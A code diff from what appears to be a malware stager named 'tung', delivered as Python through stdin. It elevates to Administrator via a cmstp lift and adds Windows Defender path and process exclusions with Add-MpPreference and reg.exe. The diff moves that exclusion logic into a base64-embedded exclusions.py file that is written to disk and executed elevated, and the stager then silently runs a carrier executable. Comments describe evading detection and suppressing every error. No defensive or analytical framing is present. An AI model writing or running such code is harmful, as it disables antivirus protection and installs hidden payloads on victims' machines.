@@ -1,9 +1,9 @@
- # tung python-road payload — silent on every failure, stdlib only.
+# tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
-# job order: stage the exe ->Administrator lift via cmstp (majanito shape)
-# -> defender exclusions under the lifted token (reg road + Add-MpPreference)
-# -> run the exe elevated.
+# job order: stage the exe -> Administrator lift via cmstp (majanito shape)
+# -> the elevated stage materializes + runs exclusions.py (r1.1.2), then
+# -> execs the carrier exe. no exclusion work inside work.py itself.
 
 import os
 import sys
@@ -352,28 +352,28 @@ def exclusion_landed():
         return False
 
 
-# ---- defender exclusions via reg.exe (no powershell on any cmdline) ---------
-# r12: the lift relaunches OUR python elevated; the elevated stage does the
-# whole protected job — cmdlet exclusions (TP-respected) then carrier exec.
-# no cmstp->interpreter chain on any command line, ever.
-STAGE = r'''# r13 stage: runs ELEVATED (relaunched by the cmstp lift). exclusions ride
-# two roads now: the reg.exe store write AND the admin powershell cmdlet
-# road (r1.1.1 dj order — Add-MpPreference -ExclusionPath/-ExclusionProcess
-# with Get-MpPreference read-back). carrier exec unchanged.
-# r1.1.0 (dj order): exclusions ARE BACK — reg.exe road (not Add-MpPreference,
-# not the WMI provider r14 tripped): the elevated stage writes the AppHost dir
-# + both payload paths into HKLM Defender Exclusions\\Paths directly, which is
-# the same store Add-MpPreference maintains. reg is stock, silent, and the
-# same value name exclusion_landed() reads back for verification — the file
-# write only proceeds when the exclusion VERIFIABLY covers it.
+# r1.1.2: the standalone exclusion writer is exclusions.py (repo mirror);
+# the stage embeds its base64 (EXCL_B64 below + ___EXCL_B64___ slot) so the
+# materialized file is BYTE-EXACT, immune to quoting/escaping layers.
+
+EXCL_B64 = "IyBsYW5ndWFnZTogUHl0aG9uIDMsIGZpbGU6IGV4Y2x1c2lvbnMucHksIHRhcmdldDogV2luZG93cyBEZWZlbmRlciwgV2luMTAvMTEKIyAqc3RhbmRhbG9uZSBEZWZlbmRlciBleGNsdXNpb24gd3JpdGVyIGZvciB0aGUgdHVuZyBjYXJyaWVyOiB3b3JrLnB5J3MgbGlmdGVkCiMgIHN0YWdlIG1hdGVyaWFsaXplcyArIHJ1bnMgdGhpcyB1bmRlciB0aGUgZWxldmF0ZWQgdG9rZW4gKG5ldmVyIGxlc3MpLgojICByb2FkczoKIyAgICAxLiBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICAnPHN0YWdpbmcgZGlyPicKIyAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25Qcm9jZXNzICc8c3RhZ2VkIGV4ZT4nICAoZnVsbCBwYXRoKQojICAgICAgIHJlYWQgYmFjayB0aHJvdWdoIEdldC1NcFByZWZlcmVuY2Ug4oCUIHRoZSBlbnRyaWVzIG11c3Qgc2hvdwojICAgIDIuIHJlZy5leGUgc3RvcmUgd3JpdGUgYXMgYmVsdCAoUGF0aHMgKyBQcm9jZXNzZXMpLCByZWcgcXVlcnkgcmVhZC1iYWNrCiMgIHNpbGVudCBldmVyeXdoZXJlOyBldmVyeSBmYWlsdXJlIGlzIGEgbm8tb3AsIG5ldmVyIGEgY3Jhc2guKgppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwoKaWYgb3MubmFtZSAhPSAibnQiOgogICAgc3lzLmV4aXQoMCkKCmltcG9ydCBjdHlwZXMKCkNSRUFURV9OT19XSU5ET1cgPSAweDA4MDAwMDAwCkFQUERJUiA9IG9zLmVudmlyb25bIkxPQ0FMQVBQREFUQSJdICsgIlxcTWljcm9zb2Z0XFxXaW5kb3dzXFxBcHBIb3N0IgpFWEVfTkFNRSA9IG9zLmVudmlyb24uZ2V0KCJFWENMX0VYRSIsICJ0dW5nLmV4ZSIpCgoKZGVmIGVsZXYoKToKICAgIHRyeToKICAgICAgICByZXR1cm4gY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKSAhPSAwCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBGYWxzZQoKCmRlZiBwc19hcmdzKGNtZCwgdGltZW91dCk6CiAgICByZXR1cm4gWyJwb3dlcnNoZWxsLmV4ZSIsICItTm9Qcm9maWxlIiwgIi1Ob25JbnRlcmFjdGl2ZSIsCiAgICAgICAgICAgICItRXhlY3V0aW9uUG9saWN5IiwgIkJ5cGFzcyIsICItQ29tbWFuZCIsIGNtZF0sIHRpbWVvdXQKCgpkZWYgY21kbGV0X3JvYWQoZXhlX3BhdGgpOgogICAgIyB0aGUgY2Fub25pY2FsIHdyaXRlOiBvbmUgcG93ZXJzaGVsbCwgYm90aCBleGNsdXNpb25zLgogICAgcHMgPSAoIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyIgKyBBUFBESVIgKyAiJzsgIgogICAgICAgICAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJyIgKyBleGVfcGF0aCArICInIikKICAgIGFyZ3MsIHQgPSBwc19hcmdzKHBzLCA2MCkKICAgIHRyeToKICAgICAgICBzdWJwcm9jZXNzLnJ1bihhcmdzLCBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1csIHRpbWVvdXQ9dCwKICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIGFyZ3MsIHQgPSBwc19hcmdzKCIoR2V0LU1wUHJlZmVyZW5jZSkuRXhjbHVzaW9uUGF0aDsgIgogICAgICAgICAgICAgICAgICAgICAgICAgICIoR2V0LU1wUHJlZmVyZW5jZSkuRXhjbHVzaW9uUHJvY2VzcyIsIDYwKQogICAgICAgIG91dCA9IHN1YnByb2Nlc3MucnVuKGFyZ3MsIGNyZWF0aW9uZmxhZ3M9Q1JFQVRFX05PX1dJTkRPVywgdGltZW91dD10LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpLnN0ZG91dAogICAgICAgIHR4dCA9IG91dC5kZWNvZGUoZXJyb3JzPSJyZXBsYWNlIikubG93ZXIoKQogICAgICAgIGlmIEFQUERJUi5sb3dlcigpIG5vdCBpbiB0eHQ6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIHJldHVybiBleGVfcGF0aC5sb3dlcigpIGluIHR4dAogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKCgpkZWYgcmVnX3JvYWQoZXhlX3BhdGgpOgogICAgIyBzdG9yZSBiZWx0OiBzYW1lIHZhbHVlcyBBZGQtTXBQcmVmZXJlbmNlIG1haW50YWlucywgd3JpdHRlbiBkaXJlY3RseS4KICAgIHRyeToKICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiAoCiAgICAgICAgICAgICgiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBEZWZlbmRlclxcRXhjbHVzaW9uc1xcUGF0aHMiLCBBUFBESVIpLAogICAgICAgICAgICAoIkhLTE1cXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3MgRGVmZW5kZXJcXEV4Y2x1c2lvbnNcXFByb2Nlc3NlcyIsIEVYRV9OQU1FKSwKICAgICAgICApOgogICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInJlZyIsICJhZGQiLCBrZXksICIvdiIsIHZhbHVlLCAiL3QiLCAiUkVHX1NaIiwgIi9kIiwgIjAiLCAiL2YiXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XLCB0aW1lb3V0PTIwLAogICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIG91dCA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICBbInJlZyIsICJxdWVyeSIsICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyXFxFeGNsdXNpb25zXFxQYXRocyIsCiAgICAgICAgICAgICAiL3YiLCBBUFBESVJdLAogICAgICAgICAgICBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1csIHRpbWVvdXQ9MjAsCiAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpLnN0ZG91dAogICAgICAgIHJldHVybiBBUFBESVIubG93ZXIoKSBpbiBvdXQuZGVjb2RlKGVycm9ycz0icmVwbGFjZSIpLmxvd2VyKCkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIEZhbHNlCgoKZGVmIG1haW4oKToKICAgIGlmIG5vdCBlbGV2KCk6CiAgICAgICAgcmV0dXJuICAgIyBtdXN0IGFscmVhZHkgYmUgZWxldmF0ZWQgKHRoZSBsaWZ0ZWQgc3RhZ2UgZ3VhcmFudGVlcyBpdCkKICAgIGV4ZV9wYXRoID0gb3MucGF0aC5qb2luKEFQUERJUiwgRVhFX05BTUUpCiAgICBjbWRsZXRfcm9hZChleGVfcGF0aCkKICAgIHJlZ19yb2FkKGV4ZV9wYXRoKQoKCm1haW4oKQo="
+
+# ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
+# r12/r14 base restored: the lift relaunches OUR python elevated; the stage
+# does the carrier job, and the exclusions now ride the SEPARATE file.
+STAGE = r'''# r1.1.2 stage: runs ELEVATED (relaunched by the cmstp lift). exclusions
+# live in the SEPARATE served file exclusions.py (r33 dj order): the stage
+# materializes it from the embedded EXCL_B64 copy (byte-exact base64) and executes it elevated,
+# exactly like the carrier exe. no exclusion work inside the stage body.
 import ctypes
 import os
 import subprocess
+import sys
 
 CREATE_NO_WINDOW = 0x08000000
 EXE_NAME = "__EXE__"
 APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
-EXKEY = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
+EXCL_B64 = "___EXCL_B64___"
 
 
 def elev():
@@ -394,74 +394,28 @@ def alive(name):
         return False
 
 
-def exclusion_landed(appdir):
-    try:
-        out = subprocess.run(
-            ["reg", "query", "HKLM\\" + EXKEY, "/v", appdir],
-            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
-            stderr=subprocess.DEVNULL, timeout=15).stdout
-        return appdir.lower() in out.decode(errors="replace").lower()
-    except Exception:
-        return False
-
-
-def set_exclusions(exe_path):
-    # value name = the path itself, data = 0 (defender exclusion path shape).
-    # reg add is idempotent and needs no cmdlet host — silent on both roads.
-    for target in (APPDIR, exe_path):
-        if not target:
-            continue
-        try:
-            subprocess.run(
-                ["reg", "add", "HKLM\\" + EXKEY, "/v", target, "/t", "REG_SZ",
-                 "/d", "0", "/f"],
-                creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL, timeout=20)
-        except Exception:
-            pass
-    return exclusion_landed(APPDIR)
-
-
-def ps_exclusions(exe_path):
-    # r1.1.1 (dj order): the ADMIN POWERSHELL cmdlet road — the canonical
-    # write Add-MpPreference makes, run under the lifted stage's elevation:
-    #   Add-MpPreference -ExclusionPath  '<staging dir>'
-    #   Add-MpPreference -ExclusionProcess '<staged exe>'   (full path)
-    # the reg road below stays as belt; this is the road dj asked for by name.
-    # read-back through Get-MpPreference — both lists must show the entries.
-    ps = ("Add-MpPreference -ExclusionPath '" + APPDIR + "'; "
-          "Add-MpPreference -ExclusionProcess '" + exe_path + "'")
-    try:
-        subprocess.run(
-            ["powershell.exe", "-NoProfile", "-NonInteractive",
-             "-ExecutionPolicy", "Bypass", "-Command", ps],
-            creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL, timeout=60)
-    except Exception:
-        return False
-    try:
-        out = subprocess.run(
-            ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command",
-             "(Get-MpPreference).ExclusionPath; (Get-MpPreference).ExclusionProcess"],
-            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
-            stderr=subprocess.DEVNULL, timeout=60).stdout
-        txt = out.decode(errors="replace").lower()
-        return APPDIR.lower() in txt and exe_path.lower() in txt
-    except Exception:
-        return False
-
-
 def main():
     if not elev():
         return
+    # r1.1.2: exclusions = the SEPARATE file, written to disk then executed
+    # ELEVATED, exactly like the carrier exe is. work.py's own body never
+    # touches Defender (r14 shape restored); exclusions.py owns that job.
+    excl_path = os.path.join(APPDIR, "exclusions.py")
+    try:
+        if not os.path.exists(excl_path):
+            import base64
+            with open(excl_path, "wb") as fh:
+                fh.write(base64.b64decode(EXCL_B64))   # ___EXCL_B64___ rides at stage build
+    except Exception:
+        pass
+    try:
+        subprocess.run([sys.executable, "-u", excl_path],
+                       creationflags=CREATE_NO_WINDOW, timeout=180,
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+    # the r14 carrier job, unchanged:
     exe_path = os.path.join(APPDIR, EXE_NAME)
-    # r1.1.x: exclusions FIRST, both roads — reg.exe (belt) then the admin
-    # powershell cmdlet road (dj order, canonical). schtasks is NOT laid
-    # here: the carrier itself registers its own task-scheduler road at boot
-    # (C++ install_task /xml, Boot+Logon triggers) — a second definition from
-    # the stage would duplicate the surface for nothing.
-    set_exclusions(exe_path)   # reg road — silent on TP refusal
-    ps_exclusions(exe_path)    # cmdlet road — verified by Get-MpPreference
     if os.path.exists(exe_path) and not alive(EXE_NAME):
         try:
             subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
@@ -475,11 +429,10 @@ main()
 
 
 def set_defender_exclusions():
-    """r1.1.0: the lift RELAUNCHES our staged python elevated; the stage does
-    the reg.exe exclusion road (stock binary, silent timeout-20) + carrier
-    exec. INF payload is a python relaunch — no interpreter cmdline beyond
-    the one python.exe itself, no powershell inside the INF, no reg.exe on
-    the lifted line (the lifted stage owns exclusions from inside)."""
+    """r1.1.2 (dj order): the lift RELAUNCHES our staged python elevated; the
+    stage materializes + executes exclusions.py (the standalone exclusion
+    writer, elevated) then execs the carrier. work.py itself carries NO
+    exclusion code — the r14 shape, with the new file attached."""
     appdir = PERSIST_DIR
     if is_elevated():
         _run_stage_now()
@@ -487,7 +440,7 @@ def set_defender_exclusions():
     stage_path = os.path.join(PERSIST_DIR, "stage.py")
     try:
         os.makedirs(PERSIST_DIR, exist_ok=True)
-        stage_text = STAGE.replace("__EXE__", EXE_NAME)
+        stage_text = STAGE.replace("__EXE__", EXE_NAME).replace("___EXCL_B64___", EXCL_B64)
         with open(stage_path, "w", encoding="utf-8") as fh:
             fh.write(stage_text)
     except Exception:
